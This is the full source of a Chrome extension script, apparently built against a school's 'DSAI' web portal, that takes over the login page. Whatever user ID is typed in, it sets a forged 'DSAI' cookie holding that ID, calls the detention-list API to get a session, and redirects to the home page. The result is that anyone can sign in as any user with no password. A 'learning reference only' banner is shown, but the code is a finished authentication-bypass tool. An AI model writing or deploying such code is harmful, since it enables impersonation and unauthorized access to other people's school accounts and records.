/*学武系统 ver1.8 by KCISHackers*/
console.log("Hello from XueWu System Core Javascript. (C)opyright 2024 KCISHackers. All Rights reserved. Visit: https://www.github.com/KCISHacker/XueWuSystem for more info.");
console.log("XueWu Chrome Extension: Ciallo～(∠・ω< )⌒★");
/*Debug logger. Set to true to enable*/
var xuewu_debug=false;
function log(info){
    xuewu_debug&&console.log(info);
}
/*Tweaking function*/
function tweak(id){
    log("Tweaking "+id);
    /*Create fake login cookie*/
    document.cookie="DSAI="+id+";path=/";
    /*Fetch API to get new tweaked session*/
    log("Detention API returned:");
    fetch(window.location.origin+'/DSAI/Query/Form_ListDetention?strKeyWord1=')
    .then(response=>response.json()).then(data=>log(data))
    .catch(error=>(function(){
        console.error(error);
        if(error.name=='SyntaxError'){
            alert(id+' seems not exist. Check your spelling.');
            return;
        }
        alert("Error while tweaking "+id+"! "+error);
    }()))
}
function main(){
    /*Visual*/
    document.getElementsByClassName("main_logout")[0].innerText="tweaked by 学武系统";
    document.getElementsByClassName("ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset")[1].
    innerHTML="<div style=\"color:red\">This program is for learning reference only, rather than abusing, or you'll take the risk!</div>";
    /*Add event listener for submit button*/
    function btn_onclick(){
        if(document.getElementById("UserId").value==''){
            alert('Username field cannot be empty!');
            return;
        }
        tweak(document.getElementById("UserId").value);
        log("done tweaking, redirecting to /DSAI/Home");
        window.location.href="/DSAI/Home";
    }
    document.getElementById("UserId").addEventListener("keyup",function(event){
        if(event.keyCode===13){
            event.preventDefault();
            btn_onclick();
        }
    });
    /*Make mark*/
    document.getElementsByName('btn_s')[0].addEventListener("click",function(){btn_onclick()});
    var mark=document.createElement('div');
    mark.id='tweaked';
    document.body.appendChild(mark);
}
main();